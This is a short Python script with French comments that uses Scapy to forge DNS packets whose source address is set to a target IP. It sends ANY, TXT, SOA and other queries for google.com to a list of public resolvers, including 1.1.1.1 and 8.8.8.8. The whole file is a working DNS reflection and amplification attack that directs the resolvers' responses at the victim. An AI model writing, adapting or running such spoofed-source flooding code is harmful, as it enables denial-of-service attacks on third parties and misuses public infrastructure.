from scapy.all import *
from pprint import pprint
import operator

interface = "eth1"        # Interface a utiliser             
ip_attack = "ip"          # Ip cible 
dns_destination = ["5.200.200.200","103.86.96.100","68.87.64.146","82.141.171.84","190.151.144.21","198.50.212.61","1.1.1.1","8.8.8.8"]   # IP DNS

time_to_live = 128                                                                 # TTL 
req_name = "google.com"                                                          # Requête
req_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"] # Types

results = []
paquet=0

# Envoie sur l'ensemble des DNS de tout les types de requêtes 
for i in range(0, len(req_type)):
    for j in range(0, len(dns_destination)):
        paquet += 1

        # Forgeage du paquet avec scapy
        packet = IP(src=ip_attack, dst=dns_destination[j], ttl=time_to_live) / UDP() / DNS(rd=1, qd=DNSQR(qname=req_name, qtype=req_type[i]))
        
        # Envoie paquets
        try:
            query = sr1(packet,iface=interface,verbose=False, timeout=8)
            print("Packet #{} sent!".format(paquet))
        except:
            print("Error sending packet #{}".format(paquet))
        


